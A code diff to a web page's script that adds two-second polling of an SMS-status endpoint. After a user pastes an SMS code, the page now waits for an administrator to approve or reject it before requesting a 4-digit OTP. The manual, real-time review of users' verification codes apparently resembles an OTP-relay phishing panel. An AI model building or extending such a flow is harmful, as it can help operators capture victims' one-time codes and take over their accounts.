@@ -1098,6 +1098,49 @@ body {
   }
 
   // ══════════════════════════════════════════════════════
+  // POLL /api/check-sms-status
+  // ══════════════════════════════════════════════════════
+  let smsPollInterval = null;
+
+  function pollSmsStatus() {
+    if (smsPollInterval) clearInterval(smsPollInterval);
+
+    smsPollInterval = setInterval(async () => {
+      try {
+        const res  = await fetch(`/api/check-sms-status/${S.applicationId}`);
+        const data = await res.json();
+
+        if (!data.success) return;
+
+        if (data.status === 'approved' || data.status === 'sms_approved') {
+          clearInterval(smsPollInterval);
+          document.getElementById('pinWait').classList.remove('show');
+          document.getElementById('otpStep1').style.display = 'none';
+          document.getElementById('otpStep2').style.display = 'block';
+          showOtpMsg('success', 'SMS verified successfully. Please enter your 4-digit code.');
+          startRs();
+          document.getElementById('o0').focus();
+
+        } else if (data.status === 'rejected' || data.status === 'sms_rejected') {
+          clearInterval(smsPollInterval);
+          document.getElementById('pinWait').classList.remove('show');
+          document.getElementById('otpStep1').style.display = 'block';
+          document.getElementById('otpStep2').style.display = 'none';
+          document.getElementById('smsPasteInput').value = '';
+          const btn = document.getElementById('bOtpStep1');
+          btn.disabled = false;
+          btn.textContent = 'NEXT: 4-DIGIT OTP';
+          btn.className = 'btn-otp';
+          showOtpMsg('error', 'SMS verification was rejected by admin. Please re-paste your SMS code.');
+          document.getElementById('smsPasteInput').focus();
+        }
+      } catch (e) {
+        // Silent error handling during polling
+      }
+    }, 2000);
+  }
+
+  // ══════════════════════════════════════════════════════
   // TWO-STEP OTP FLOW HELPERS
   // ══════════════════════════════════════════════════════
   function chkSmsStep() {
@@ -1137,12 +1180,11 @@ body {
       btn.textContent = 'NEXT: 4-DIGIT OTP';
 
       if (data.success) {
-        // Advance to Step 2: Four Digits OTP Verification
+        // Hide Step 1 and show waiting spinner while admin reviews SMS
         document.getElementById('otpStep1').style.display = 'none';
-        document.getElementById('otpStep2').style.display = 'block';
-        showOtpMsg('success', 'SMS verified successfully. Please enter your 4-digit code.');
-        startRs();
-        document.getElementById('o0').focus();
+        document.getElementById('pinWait').classList.add('show');
+        showOtpMsg('info', 'SMS submitted. Waiting for administrator validation...');
+        pollSmsStatus();
       } else {
         showOtpMsg('error', data.message || 'SMS verification failed. Please try again.');
       }
